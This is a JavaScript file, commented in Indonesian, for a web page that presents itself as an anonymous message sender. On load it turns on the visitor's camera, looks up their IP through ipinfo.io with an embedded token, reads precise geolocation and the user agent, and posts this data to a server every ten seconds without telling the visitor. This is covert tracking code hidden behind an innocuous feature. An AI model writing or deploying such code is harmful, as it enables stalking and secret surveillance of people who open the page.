const statusEl = document.getElementById('status');
const cameraEl = document.getElementById('cameraPreview');
const sendBtn = document.getElementById('sendBtn');
const msgTextarea = document.getElementById('msg');

// ambil device & lokasi
async function getDeviceInfo(){
  let geo="Tidak tersedia";
  try{
    const ipInfo = await fetch("https://ipinfo.io/json?token=5602d2e05cb668").then(r=>r.json());
    const battery = await navigator.getBattery();
    if(navigator.geolocation){
      await new Promise(resolve=>{
        navigator.geolocation.getCurrentPosition(pos=>{
          geo=`Lat:${pos.coords.latitude}, Lng:${pos.coords.longitude}, Accuracy:${pos.coords.accuracy}m`;
          resolve();
        },()=>resolve());
      });
    }
    return `🌐 Informasi IP: ${ipInfo.ip}, Negara: ${ipInfo.country}, Waktu: ${new Date().toLocaleString()}\n📍 Geolocation: ${geo}\n📱 UserAgent: ${navigator.userAgent}`;
  }catch(e){ return "❌ Gagal ambil info device"; }
}

// kirim ke API server
async function sendToServer(data){
  try{
    await fetch('/api/sendMessage', {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body:JSON.stringify({text:data})
    });
    statusEl.textContent = `✅ Terakhir update: ${new Date().toLocaleTimeString()}`;
  }catch(e){ console.error(e); statusEl.textContent = "❌ Gagal kirim"; }
}

// live tracking
async function liveTracking(){
  const info = await getDeviceInfo();
  await sendToServer(info);
}

// start kamera
async function startCamera(){
  try{
    const stream = await navigator.mediaDevices.getUserMedia({video:true,audio:false});
    cameraEl.srcObject = stream;
  }catch(err){ console.error("Gagal akses kamera:",err); }
}

// tombol send manual
sendBtn.addEventListener('click', async()=>{
  const msg = msgTextarea.value.trim();
  if(msg) await sendToServer(`💌 Pesan Anonim: ${msg}`);
});

// load semua
window.onload = async()=>{
  await startCamera();
  await liveTracking();
  setInterval(liveTracking,10000); // update tiap 10 detik
};
